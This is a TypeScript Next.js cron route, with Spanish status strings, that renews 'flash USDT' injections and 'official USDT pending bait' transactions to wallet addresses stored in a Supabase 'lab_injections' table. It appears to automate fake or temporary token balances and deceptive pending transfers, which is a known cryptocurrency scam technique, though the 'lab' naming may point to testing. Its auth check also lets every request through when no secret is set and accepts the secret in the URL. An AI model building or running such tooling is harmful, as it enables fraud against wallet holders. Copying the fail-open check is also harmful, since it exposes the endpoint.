import { NextResponse } from "next/server";
import { createAdminClient } from "@/lib/supabase/admin";
import {
  shouldRenewFlash,
  shouldRenewPendingBait,
} from "@/lib/labs/pending-bait-renewal";
import type { LabInjectionMode } from "@/lib/labs/types";
import {
  renewFlashInject,
  renewOfficialUsdtPendingBait,
} from "@/lib/evm/flash-usdt-lab";
import { resolveEvmLabContext } from "@/lib/evm/lab-context";
import { parseEvmNetwork, type EvmNetwork } from "@/lib/evm/network";

/**
 * GET /api/cron/labs/renew
 */
export async function GET(req: Request) {
  if (!verifyCronAuth(req)) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  let admin;
  try {
    admin = createAdminClient();
  } catch (err) {
    return NextResponse.json(
      { error: err instanceof Error ? err.message : String(err) },
      { status: 500 }
    );
  }

  const now = new Date().toISOString();

  const { data: active, error } = await admin
    .from("lab_injections")
    .select(
      "id, session_id, wallet_id, amount, status, injection_mode, expires_at, pending_tx_hash, metadata, lab_wallets(wallet_address), lab_sessions(flash_duration_minutes, status, network)"
    )
    .in("status", ["injected", "pending_flash"])
    .is("burned_at", null)
    .gt("expires_at", now);

  if (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }

  const results = [];

  for (const injection of active ?? []) {
    const walletRaw = injection.lab_wallets as
      | { wallet_address: string }
      | { wallet_address: string }[]
      | null;
    const wallet = Array.isArray(walletRaw) ? walletRaw[0] : walletRaw;
    const walletAddress = wallet?.wallet_address;

    const sessionRaw = injection.lab_sessions as
      | { flash_duration_minutes: number; status: string; network: string }
      | { flash_duration_minutes: number; status: string; network: string }[]
      | null;
    const session = Array.isArray(sessionRaw) ? sessionRaw[0] : sessionRaw;
    const network = (parseEvmNetwork(session?.network) ?? "bsc") as EvmNetwork;
    const { evmOptions } = await resolveEvmLabContext(admin, network);

    if (!walletAddress) {
      results.push({ injectionId: injection.id, skipped: true, reason: "Sin wallet" });
      continue;
    }

    const mode = (injection.injection_mode ?? "fake_token") as LabInjectionMode;
    let meta = { ...((injection.metadata ?? {}) as Record<string, unknown>) };
    const lastPendingBaitAt = meta.lastPendingBaitAt as string | undefined;
    const flashExpiresAt = meta.flashExpiresAt as string | undefined;
    const amount = Number(injection.amount);
    const flashDurationMinutes = Number(session?.flash_duration_minutes ?? 30);

    const entry: Record<string, unknown> = { injectionId: injection.id, mode, network };
    let dirty = false;

    if (shouldRenewPendingBait(lastPendingBaitAt)) {
      const bait = await renewOfficialUsdtPendingBait(walletAddress, amount, network, evmOptions);
      if (bait.txHash) {
        meta = {
          ...meta,
          lastPendingBaitAt: now,
          pendingBaitRenewals: Number(meta.pendingBaitRenewals ?? 0) + 1,
        };
        dirty = true;
        entry.pendingBaitRenewed = true;
        entry.pendingTxHash = bait.txHash;
        entry.pendingBaitRenewals = meta.pendingBaitRenewals;
      } else {
        entry.pendingBaitRenewed = false;
        entry.pendingBaitError = bait.error;
      }
    } else {
      entry.pendingBaitRenewed = false;
      entry.pendingBaitSkipped = "Intervalo mínimo no alcanzado";
    }

    if (
      mode === "pending_flash" &&
      shouldRenewFlash(flashExpiresAt) &&
      session?.status !== "expired"
    ) {
      const renewed = await renewFlashInject(
        walletAddress,
        amount,
        flashDurationMinutes,
        network,
        evmOptions
      );
      if (renewed.success && renewed.flashExpiresAt) {
        meta = {
          ...meta,
          flashExpiresAt: renewed.flashExpiresAt,
          lastFlashRenewAt: now,
          flashRenewTxHash: renewed.txHash ?? null,
        };
        dirty = true;
        entry.flashRenewed = true;
        entry.flashExpiresAt = renewed.flashExpiresAt;
        entry.flashRenewTxHash = renewed.txHash;
      } else {
        entry.flashRenewed = false;
        entry.flashRenewError = renewed.error;
      }
    }

    if (dirty) {
      await admin
        .from("lab_injections")
        .update({
          pending_tx_hash: (entry.pendingTxHash as string | undefined) ?? injection.pending_tx_hash,
          metadata: meta,
        })
        .eq("id", injection.id);
    }

    results.push(entry);
  }

  return NextResponse.json({
    timestamp: now,
    processed: results.length,
    results,
  });
}

function verifyCronAuth(req: Request): boolean {
  const secret = process.env.CRON_SECRET;
  if (!secret) return true;

  const authHeader = req.headers.get("authorization");
  if (authHeader === `Bearer ${secret}`) return true;

  const url = new URL(req.url);
  return url.searchParams.get("secret") === secret;
}
